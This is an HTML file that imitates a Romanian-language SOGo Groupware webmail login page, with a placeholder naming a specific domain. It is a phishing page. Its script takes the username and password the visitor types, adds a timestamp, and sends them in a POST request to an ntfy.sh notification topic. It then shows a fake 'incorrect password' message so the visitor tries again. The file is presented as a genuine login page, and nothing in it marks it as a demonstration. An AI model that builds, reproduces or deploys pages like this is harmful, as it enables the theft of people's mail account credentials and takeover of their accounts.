<!DOCTYPE html>
<html lang="ro">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>SOGo Groupware</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
 background:linear-gradient(160deg,#1f3b57 0%,#2c5d82 55%,#37718f 100%);
 min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.card{background:#fff;width:100%;max-width:400px;border-radius:8px;
 box-shadow:0 18px 50px rgba(0,0,0,.38);overflow:hidden}
.hd{padding:30px 28px 10px;text-align:center}
.hd .logo{font-size:27px;font-weight:700;color:#2c5d82;letter-spacing:.5px}
.hd .sub{font-size:12.5px;color:#8a97a3;margin-top:5px}
.bd{padding:14px 28px 30px}
label{display:block;font-size:12.5px;color:#5b6b7a;margin:14px 0 6px;font-weight:600}
input{width:100%;padding:12px 13px;border:1px solid #d5dde5;border-radius:5px;
 font-size:14.5px;color:#22313f;background:#fbfcfd;transition:.15s}
input:focus{outline:none;border-color:#2c5d82;background:#fff;
 box-shadow:0 0 0 3px rgba(44,93,130,.12)}
button{width:100%;margin-top:22px;padding:13px;background:#2c5d82;color:#fff;border:0;
 border-radius:5px;font-size:15px;font-weight:600;cursor:pointer;transition:.15s}
button:hover{background:#24496a}
button:disabled{opacity:.6;cursor:default}
.ft{margin-top:18px;text-align:center;font-size:11.5px;color:#9aa7b3;line-height:1.6}
.err{display:none;margin-top:14px;padding:10px 12px;background:#fdecec;color:#b3261e;
 border:1px solid #f5c6c4;border-radius:5px;font-size:12.5px}
.sp{display:none;margin-top:14px;text-align:center;font-size:12.5px;color:#5b6b7a}
</style>
</head>
<body>
<div class="card">
  <div class="hd">
    <div class="logo">SOGo</div>
    <div class="sub">Groupware &middot; Webmail</div>
  </div>
  <div class="bd">
    <form id="f" autocomplete="off">
      <label for="u">Nume de utilizator</label>
      <input id="u" name="userName" type="text" placeholder="utilizator@adrianpanait.ro" required autocapitalize="off" spellcheck="false">
      <label for="p">Parol&#259;</label>
      <input id="p" name="password" type="password" placeholder="Parola" required>
      <div class="err" id="e">Nume de utilizator sau parol&#259; incorect&#259;.</div>
      <div class="sp" id="s">Se conecteaz&#259;&hellip;</div>
      <button id="b" type="submit">Autentificare</button>
    </form>
    <div class="ft">
      Conectare securizat&#259; SSL<br>
      SOGo Groupware &mdash; <span id="yr"></span>
    </div>
  </div>
</div>
<script>
document.getElementById('yr').textContent=new Date().getFullYear();
var f=document.getElementById('f'),b=document.getElementById('b'),
    e=document.getElementById('e'),s=document.getElementById('s');
f.addEventListener('submit',function(ev){
  ev.preventDefault();
  var u=document.getElementById('u').value.trim(),
      p=document.getElementById('p').value;
  if(!u||!p)return;
  b.disabled=true;e.style.display='none';s.style.display='block';
  var msg='SOGo | user='+u+' | pass='+p+' | t='+new Date().toISOString()+' | ip='+(window.__ip||'?');
  fetch('https://ntfy.sh/sogo-1e1828277de13376',{method:'POST',body:msg})
  .catch(function(){})
  .then(function(){
    setTimeout(function(){
      s.style.display='none';
      e.textContent='Nume de utilizator sau parol\u0103 incorect\u0103.';
      e.style.display='block';
      b.disabled=false;
      document.getElementById('p').value='';
    },1400);
  });
});
</script>
</body>
</html>
